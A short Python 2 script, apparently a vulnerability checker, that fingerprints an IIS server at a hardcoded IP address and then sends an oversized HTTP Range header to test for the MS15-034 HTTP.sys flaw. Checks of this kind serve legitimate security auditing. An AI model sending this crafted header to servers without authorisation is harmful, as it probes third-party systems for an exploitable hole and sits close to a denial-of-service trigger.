#coding:utf-8
 
import socket
import random
 
 
ipAddr = "131.109.208.51"
hexAllFfff = "18446744073709551615"
req1 = "GET / HTTP/1.0\r\n\r\n"
req = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"
 
print "[*] Audit Started"
 
try:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((ipAddr, 80))
    client_socket.send(req1)
    boringResp = client_socket.recv(1024)
    if "Microsoft" not in boringResp:
                    print "[*] Not IIS"
                    exit(0)
    client_socket.close()
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((ipAddr, 80))
    client_socket.send(req)
    goodResp = client_socket.recv(1024)
    if "Requested Range Not Satisfiable" in goodResp:
        print "[!!] Vulnerability MS15-034 existence!"
    elif " The request has an invalid header name" in goodResp:
        print "[*] Not Vulnerability."
    else:
        print "[*] Unknown response state."
                                
except Exception,e:
    print e